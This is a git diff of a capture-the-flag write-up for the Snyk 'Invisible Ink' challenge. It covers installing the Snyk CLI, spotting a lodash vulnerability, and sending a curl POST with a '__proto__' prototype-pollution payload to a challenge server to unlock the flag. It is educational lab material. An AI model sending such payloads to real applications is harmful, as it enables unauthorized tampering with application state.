@@ -1,5 +1,11 @@
-link: https://ctf-101.snyk.io/challenges#Invisible%20Ink
-server: http://35.211.53.53:8000/
+# Objective
+
+Retrive a flag throuh a POST request manipulating the value through a vulnerability
+
+# Resources to install
+
+Link: https://ctf-101.snyk.io/challenges#Invisible%20Ink
+Server: http://35.211.53.53:8000/
 
 Expose hidden vulnerabilities in the web application.
 
@@ -8,25 +14,35 @@ https://github.com/snyk/snyk#installation
 
 Install npm if you don't have ii yet:
 
-$sudo apt-get install npm
+```
+*$sudo apt-get install npm*
+```
 
 Now install snyk CLI:
 
-$npm install snyk@latest -g
+```
+*$npm install snyk@latest -g*
+```
 
 You need to access to snyk before you can run the command to test the package->
 
-$snyk auth  (I suggest to access with gitHub)
+```
+*$snyk auth  (I suggest to access with gitHub)*
+```
 
 Now you have to install the package
 
 ***what is package.json*** -> https://blog.ezekielekunola.com/understanding-the-package.json-file
 
-$npm install package.json
+```
+*$npm install package.json*
+```
 
 Run this command into the folder with package.json, where you have just ran the previous command:
 
-$snyk monitor
+```
+*$snyk monitor*
+```
 
 This command will show you the current vulnerabilities found.
 Possible  response:
@@ -37,10 +53,14 @@ Notifications about newly disclosed issues related to these dependencies will be
 
 Click on the link generated here you will find the current Vunerabilities
 
-Browsing into the server to hack, you will find a response, which will suggest you a request to do.
+
+
+Browsing into the ***server*** to hack, you will find a response, which will suggest you a request to do.
 Below there is the command to run:
 
-$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message": "ping"}' 
+```
+*$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message": "ping"}'* 
+```
 
 ***Response***
 {"userID":"::ffff:82.57.151.149","time":1651490382169,"message":"ping","flag":"disabled"} 
@@ -56,7 +76,10 @@ https://security.snyk.io/vuln/SNYK-JS-LODASH-567746
 
 This could be a possible solution:
 
-$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message":"ping","__proto__":{"flag":"true"}}'  
+```
+*$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message":"ping","__proto__":{"flag":"true"}}'*
+```
+
 ***Response***
 
 {"userID":"::ffff:82.57.151.149","time":1651497940769,"message":"ping","flag":"SNYK{FLAGTOFIND}"} 
